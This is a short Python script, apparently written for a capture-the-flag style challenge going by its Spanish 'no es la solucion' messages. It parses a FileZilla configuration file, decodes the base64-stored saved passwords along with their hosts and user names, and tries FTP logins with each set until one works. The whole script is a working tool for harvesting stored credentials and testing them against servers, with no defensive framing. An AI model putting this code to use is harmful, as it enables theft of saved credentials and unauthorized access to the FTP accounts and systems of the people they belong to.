from ftplib import FTP
import base64
IPList = []
UserList = []
PasswordList = []

with open('filezilla.xml', 'r',encoding='utf-8') as f:
    data = f.readlines()
    for i in data:
        if '<Pass encoding="base64">' in i:
            base64_bytes = i.replace('<Pass encoding="base64">', '').replace('</Pass>', '').strip().encode('ascii')
            message_bytes = base64.b64decode(base64_bytes)
            message = message_bytes.decode('ascii')
            PasswordList.append(message)
        elif '<Host>' in i:
            IPList.append(i.replace('<Host>', '').replace('</Host>', '').strip())
        elif '<User>' in i:
            UserList.append(i.replace('<User>','').replace('</User>','').strip())

for i in range(len(PasswordList)):
    try:
        ftp = FTP(IPList[i], user=UserList[i], passwd=PasswordList[i], timeout=2.)
        print("Bingo! -> " + str(i))
        break
    except:
        print(str(i) + " no es la solucion")
        continue